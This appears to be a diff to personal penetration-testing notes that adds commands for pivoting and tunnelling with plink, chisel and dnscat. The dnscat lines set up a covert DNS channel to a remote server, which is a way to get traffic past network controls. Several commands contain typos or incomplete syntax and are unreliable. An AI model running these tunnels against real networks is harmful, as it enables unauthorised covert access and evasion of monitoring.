@@ -346,5 +346,19 @@ wc # word count
             $ plink.exe -ssh -l ed -R IP_A:port:IP_b:80 IP_A  # A is the ssource host, b is the target host
 
         chisel #to create http protocol tunnel
-            $ chisel server -p port --reverse # on host A
-            $ chisel client IP_A   3 on host B
+            $ chisel server -p port --reverse # on host A, which is the source host
+            $ chisel client IP_A   3 on host B  # the jumper
+
+        dnscat # only allow on linux
+            # on the server 
+                $ nscat2-server findme.com(domainname)
+
+                
+            #on the client
+            $ scp kali@IP:/usr/bin/dnscat .
+            $ chmod +x 
+            $ ./dnscat --dns server=IP , port=xx
+        
+
+
+        
